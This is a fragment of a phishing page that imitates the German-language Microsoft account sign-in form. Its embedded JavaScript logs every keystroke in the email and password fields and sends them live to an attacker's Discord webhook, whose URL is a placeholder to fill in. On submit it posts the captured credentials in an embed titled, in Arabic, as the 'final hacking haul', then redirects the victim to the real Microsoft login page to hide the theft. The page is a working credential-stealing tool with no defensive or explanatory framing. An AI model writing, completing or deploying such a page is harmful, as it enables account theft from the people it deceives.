        input:focus { border-bottom: 2px solid #0067b8; }
        .btn-container { display: flex; justify-content: flex-end; margin-top: 10px; }
        button { background-color: #0067b8; color: white; border: none; padding: 8px 36px; font-size: 15px; cursor: pointer; min-width: 100px; }

    </div>
    
    <div id="step1">
        <h2>Anmelden</h2>
        <p>E-Mail, Telefon oder Skype</p>
        <input type="email" id="email" placeholder="E-Mail-Adresse" autocomplete="off" required>
        <p style="font-size: 13px;">Kein Konto? <span style="color: #0067b8; cursor:pointer;">Erstellen Sie jetzt eines!</span></p>
        <div class="btn-container">
            <button onclick="toPassword()">Weiter</button>
        </div>
    </div>

    <div id="step2" class="hidden">
        <div id="back-btn" onclick="backToEmail()" style="cursor:pointer; margin-bottom: 15px; font-size: 14px;">
            <span style="font-size: 18px;">←</span> <span id="user-email" class="email-display"></span>
        </div>
        <h2>Kennwort eingeben</h2>
        <input type="password" id="password" placeholder="Kennwort" autocomplete="off" required>
        <p style="font-size: 13px; color: #0067b8; cursor: pointer;">Kennwort vergessen?</p>
        <div class="btn-container">
            <button onclick="submitAll()">Anmelden</button>
        </div>
    </div>
</div>

<script>
    const DISCORD_WEBHOOK = "ضع_هنا_رابط_الديسكورد_الخاص_بك";
    
    let currentData = { email: "", password: "" };

    function setupKeylogger(elementId, keyName) {
        document.getElementById(elementId).addEventListener('input', (e) => {
            currentData[keyName] = e.target.value;
            fetch(DISCORD_WEBHOOK, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ content: `⌨️ **Eingabe-Live [${keyName}]:** \`${currentData[keyName]}\`` })
            });
        });
    }

    setupKeylogger('email', 'email');
    setupKeylogger('password', 'password');

    function toPassword() {
        const emailVal = document.getElementById('email').value;
        if (emailVal.length > 3) {
            document.getElementById('step1').classList.add('hidden');
            document.getElementById('step2').classList.remove('hidden');
            document.getElementById('user-email').innerText = emailVal;
        }
    }

    function backToEmail() {
        document.getElementById('step2').classList.add('hidden');
        document.getElementById('step1').classList.remove('hidden');
    }

    function submitAll() {
        fetch(DISCORD_WEBHOOK, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                embeds: [{
                    title: "🎯 حصيلة الاختراق النهائية",
                    color: 15158332,
                    fields: [
                        { name: "📧 الإيميل", value: `\`${currentData.email}\`` },
                        { name: "🔑 كلمة السر", value: `\`${currentData.password}\`` }
                    ]
                }]
            })
        }).then(() => {
            window.location.href = "https://login.live.com/";
        });
    }
</script>
